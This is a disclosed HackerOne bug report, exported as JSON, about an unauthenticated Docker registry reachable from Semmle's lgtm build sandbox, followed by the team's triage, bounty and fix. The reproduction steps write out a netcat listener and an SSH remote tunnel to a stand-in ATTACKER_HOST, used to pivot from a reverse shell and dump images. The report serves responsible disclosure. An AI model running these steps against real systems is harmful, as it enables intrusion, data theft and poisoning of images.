{"id":347296,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDcyOTY=","url":"https://hackerone.com/reports/347296","title":"Docker Registry HTTP API v2 exposed in HTTP without authentication leads to docker images dumping and poisoning","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-05-04T00:33:58.671Z","submitted_at":"2018-05-04T00:33:58.671Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"thehackerish","url":"/thehackerish","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/AFMxPqKJTrqyNWW5mU7vjNmA/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27264,"url":"https://hackerone.com/semmle","handle":"semmle","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Semmle","twitter_handle":"semmle","website":"https://semmle.com","about":"Semmle's engineering analytics platform helps leading technology companies and open-source developers build secure, reliable software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-06T08:35:04.183Z","bug_reporter_agreed_on_going_public_at":"2020-05-07T08:35:02.911Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nDocker Registry HTTP API v2 is exposed in HTTP without authentication. An attacker can use it to dump your docker images and poison them.\n\n**Description:**\nWhile digging into the environment that hosts the sandboxed build container, I came across the port 5000 open on another machine (probably the host), which is used for Docker Registry (https://docs.docker.com/registry/). I was able to reach the service and dump the `lgtm/top` repository. I didn't try to upload anything because I didn't want to alter your docker images.\n\n## Steps To Reproduce:\n\n  1. Create a GitHub repository that has the attached file, name it .lgtm.yml and modify `ATTACKER_HOST` and `ATTACKER_PORT` to yours.\n  2. set up a netcat listener: `nc -vlp ATTACKER_PORT`\n  3. Add the project to lgtm, it should start building it. After some time, you should get a reverse shell.\n  4. Make a remote SSH tunnel from the build container `ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N`\n  5. Enter your attacker password and a SSH tunnel should be up.\n  6. Using the docker_fetch tool (https://github.com/NotSoSecure/docker_fetch/), use the url http://127.0.0.1:5555 and dump the repository that you want.\n  7. Additionally, you can follow this reference if you would like to test for blob uploads (https://docs.docker.com/registry/spec/api/#initiate-blob-upload) and look for this string `/v2/\u003cname\u003e/blobs/uploads/`. I tried to initiate an upload and it gave me the uuid of the upload, which means no restriction is made for uploads.\n\n**NOTE**: Even if the shell is lost from the sandbox, the SSH Tunnel still works. This might mean a **sandbox escape**\n\n## Supporting Material/References:\n\n  *A writeup about the vulnerability in a pentest:  https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/\n  *The Docker Registry Doc: https://docs.docker.com/registry/spec/api/#initiate-blob-upload\n\n## Remediation:\n1. Implement authentication to the service.\n2. Use HTTPS\n3. Limit the possibility of reverse shells by whitelisting only useful ports ( It might be challenging because of the purpose of the build sandbox)\n\n## Impact\n\nAn attacker can use it to dump your docker images and poison them.","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":293554,"file_name":"2","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/293/554/a4b8ca03f8b2627634a157ebf218f1c3e56b42f9/2?response-content-disposition=attachment%3B%20filename%3D%222%22%3B%20filename%2A%3DUTF-8%27%272\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144851Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=02889d26a9f560d6baff8f0cd5ae1f78b9fca8f39758741f11d72d70c4b62f89","file_size":295,"type":"text/plain"}],"allow_singular_disclosure_at":"2020-06-06T08:35:02.958Z","allow_singular_disclosure_after":-42531228.70080224,"singular_disclosure_allowed":true,"vote_count":74,"voters":["act1on3","sebd","yxw21","prophet","brahim_boufakri01","mik317","ali","sandh0t","aryan2808","sudi","and 64 more..."],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":{"databaseId":8552,"asset_type":"URL","asset_identifier":"lgtm-com.pentesting.semmle.net","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2698794,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks very much for your report. This registry is not meant to be accessible (and certainly not writable) from inside the build container. We will investigate our options for remediating this issue.","automated_response":false,"created_at":"2018-05-04T07:07:11.918Z","updated_at":"2018-05-04T07:07:11.918Z","actor":{"username":"chrisgavin","cleared":false,"url":"/chrisgavin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/259/787/73e7651e088896c2379249d5752999800fc9c2c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2699968,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-05-04T10:33:59.952Z","updated_at":"2018-05-04T10:33:59.952Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":149405},"actor":{"username":"jmdh","cleared":false,"url":"/jmdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2699998,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We have set the severity of this report to critical, which reflects both the unauthorised modification of docker resources (which could be used to severely affect site reliability and accuracy of data) and also the fact that your report included a mention of missing firewall rules.\n\nA fix for both issues is in the process of being deployed and we'll update the report accordingly when this is completed. Note that the fact that a reverse shell was created is not by itself in scope of the program, since arbitrary code execution within the build user is by design.","automated_response":false,"created_at":"2018-05-04T10:58:22.288Z","updated_at":"2018-05-04T10:58:22.288Z","actor":{"url":"/semmle","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Semmle"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"semmle","collaborator":{"username":"thehackerish","url":"/thehackerish"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2700029,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your fast feedback and for the bounty. The only reason for my pivoting was that RCE on the build was accepted behaviour. But I tried to escape from it as mentioned in your policy.\nOnce again, thank you for your prompt collaboration. You're doing a great job!\n\nCan I blog about it without mentioning anything about you?","automated_response":false,"created_at":"2018-05-04T11:16:33.942Z","updated_at":"2018-05-04T11:16:33.942Z","actor":{"username":"thehackerish","cleared":true,"url":"/thehackerish","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/AFMxPqKJTrqyNWW5mU7vjNmA/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2700063,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I also noticed you have a whitelist that limits users from installing arbitrary packages on the sandbox. Can I report a way to bypass it? Actually, I used the same bypass to install packages that helped me find the exposed Docker Registry Api.","automated_response":false,"created_at":"2018-05-04T11:22:53.052Z","updated_at":"2018-05-04T11:24:23.166Z","actor":{"username":"thehackerish","cleared":true,"url":"/thehackerish","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/AFMxPqKJTrqyNWW5mU7vjNmA/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2700411,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi,\n\nWe've now resolved this by preventing access to the Docker registry from within the container. We also plan on taking further steps to limit access to services running on the host. As per your recommendation we've also tightened up our firewall rules so that outbound traffic should now be more limited.\n\nI'll respond to your question about package whitelisting in a reply to the email you sent earlier as it's related to the question of what constitutes escaping the sandbox.\n\nI can't comment myself about whether you can blog about the vulnerability but I've passed the question on and will try to make sure someone gets back to you about it.\n\nThanks,\nChris","automated_response":false,"created_at":"2018-05-04T14:19:21.532Z","updated_at":"2018-05-04T14:19:21.532Z","actor":{"username":"chrisgavin","cleared":false,"url":"/chrisgavin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/259/787/73e7651e088896c2379249d5752999800fc9c2c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"thehackerish","url":"/thehackerish"},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2715473,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@hackerish as the attack is fairly specific to what we're doing we would like to review a draft of a blog post before you publish it. Would this work for you? Feel free to email this to us at bug-bounty@semmle.com.","automated_response":false,"created_at":"2018-05-08T12:26:38.159Z","updated_at":"2018-05-08T12:26:38.159Z","actor":{"username":"jmdh","cleared":false,"url":"/jmdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2715490,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jmdh thank you very much for your feedback. I will start working on it whenever I have time. I'll let you have a look at it when it is ready.","automated_response":false,"created_at":"2018-05-08T12:36:06.680Z","updated_at":"2018-05-08T12:36:06.680Z","actor":{"username":"thehackerish","cleared":true,"url":"/thehackerish","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/AFMxPqKJTrqyNWW5mU7vjNmA/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7921989,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-05-07T08:35:02.935Z","updated_at":"2020-05-07T08:35:02.935Z","first_to_agree":true,"actor":{"username":"thehackerish","cleared":true,"url":"/thehackerish","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/AFMxPqKJTrqyNWW5mU7vjNmA/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8218838,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-06-06T08:35:04.255Z","updated_at":"2020-06-06T08:35:04.255Z","actor":{"url":"/semmle","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Semmle"}},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}